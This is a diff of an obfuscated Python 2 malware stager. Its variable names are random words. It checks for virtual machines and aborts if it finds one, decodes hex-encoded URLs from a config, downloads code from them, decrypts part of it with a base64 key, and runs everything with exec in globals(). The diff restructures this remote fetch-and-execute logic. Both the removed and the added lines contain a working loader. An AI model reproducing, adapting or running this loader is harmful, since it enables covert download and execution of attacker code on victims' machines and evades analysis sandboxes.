@@ -79,7 +79,7 @@ def main(*args, **kwargs):
             vector  = block
             result.append(output)
         return ''.join(result).rstrip("\x00")
-    
+        
     def CrystallineSluggishAnatomy(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
         SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
@@ -125,12 +125,11 @@ def main(*args, **kwargs):
                             SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
                     else:
                         SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
-            finally:                
-                if 'z' in AccidentalAquaticCat: 
-                    exec '\n'.join([QuadraticFungalLegend(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), base64.b64decode(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read())).format(json.dumps(AccidentalAquaticCat)), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()]) in globals()
-                else:
-                    exec '\n'.join([urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read().format(json.dumps(AccidentalAquaticCat))]) in globals()
-
+            except Exception as e:
+                if __DEBUG__:
+                    print("Load error: {}".format(str(e)))
+            return AccidentalAquaticCat                
+                
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
     if 'checkvm' in kwargs:
@@ -139,7 +138,22 @@ def main(*args, **kwargs):
                 print('aborting')
             sys.exit(0)
     if 'config' in kwargs:
-        return CrystallineSluggishAnatomy(**kwargs)
+        AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
+        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
+        if 'z' in AccidentalAquaticCat: 
+            header = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            header = header.format(json.dumps(AccidentalAquaticCat))
+            footer = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
+            footer = base64.b64decode(footer)
+            body   = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            body   = QuadraticFungalLegend(body, footer)
+            code   = '\n\n\n'.join([body, header])
+        else:
+            data = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            text = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            text = text.format(json.dumps(AccidentalAquaticCat))
+            code = '\n\n\n'.join([data, text])
+        exec code in globals()
 
 
 
